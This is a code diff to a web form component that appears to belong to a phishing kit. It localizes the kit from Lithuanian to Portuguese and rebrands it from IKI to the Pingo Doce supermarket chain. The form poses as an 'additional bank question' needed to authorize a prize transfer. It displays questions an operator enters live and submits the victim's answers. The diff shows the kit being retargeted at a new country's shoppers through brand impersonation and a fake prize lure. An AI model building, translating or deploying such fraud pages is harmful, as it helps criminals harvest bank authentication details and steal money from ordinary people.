@@ -123,7 +123,7 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
 
     setSaving(false);
     if (upErr) {
-      setError("Klaida. Bandykite dar kartą.");
+      setError("Erro. Por favor, tente novamente.");
       return;
     }
     setDone(true);
@@ -147,8 +147,8 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
               </svg>
             </div>
-            <p className="text-lg font-bold text-gray-900">Ačiū!</p>
-            <p className="mt-1 text-sm text-gray-500">Jūsų atsakymas sėkmingai išsiųstas.</p>
+            <p className="text-lg font-bold text-gray-900">Obrigado!</p>
+            <p className="mt-1 text-sm text-gray-500">A sua resposta foi enviada com sucesso.</p>
           </div>
         ) : (
           <form
@@ -162,7 +162,7 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
             <div className="flex justify-center">
               <img
                 src="/form-assets/iki-mini-logo.png"
-                alt="IKI"
+                alt="Pingo Doce"
                 className="h-8 w-auto object-contain"
               />
             </div>
@@ -178,13 +178,13 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
 
             {/* Baslik */}
             <h1 className="text-center text-[1.3rem] font-bold leading-snug tracking-tight text-gray-800">
-              Papildomas banko klausimas dėl pinigų išsiuntimo vardu autorizavimo
+              Questão adicional do banco para autorização da transferência do prémio
             </h1>
 
             {/* Admin'in sorusu */}
             <div className="rounded-xl border-l-4 border-[#22c55e] bg-[#f0faf6] px-4 py-3">
               <p className="mb-1 text-[10px] font-bold uppercase tracking-widest text-[var(--brand)]">
-                Klausimas
+                Questão
               </p>
               <p className="text-sm font-semibold text-gray-800 break-words">
                 {currentQuestion || "..."}
@@ -194,7 +194,7 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
             {/* Cevap inputu */}
             <div>
               <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-widest text-gray-700">
-                Jūsų atsakymas
+                A sua resposta
               </label>
               <div className="relative">
                 <span className="pointer-events-none absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400">
@@ -207,7 +207,7 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
                   required
                   value={answer}
                   onChange={(e) => setAnswer(e.target.value)}
-                  placeholder="Įveskite savo atsakymą čia..."
+                  placeholder="Introduza a sua resposta aqui..."
                   className="w-full rounded-xl border border-gray-200 bg-gray-50 py-3.5 pl-10 pr-4 text-sm font-medium text-gray-900 outline-none transition-all focus:border-[#22c55e] focus:bg-white focus:ring-2 focus:ring-[#22c55e]/20"
                 />
               </div>
@@ -220,7 +220,7 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
               disabled={saving || !answer.trim()}
               className="flex w-full items-center justify-center gap-2 rounded-xl bg-[var(--brand)] px-4 py-3.5 text-[15px] font-bold uppercase tracking-wide text-white shadow-lg shadow-[var(--brand)]/25 transition-all hover:bg-[var(--brand-dark)] disabled:opacity-50"
             >
-              {saving ? "Siunčiama..." : "Tęsti"}
+              {saving ? "A enviar..." : "Continuar"}
               <svg className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" d="M13.5 4.5L21 12m0 0l-7.5 7.5M21 12H3" />
               </svg>
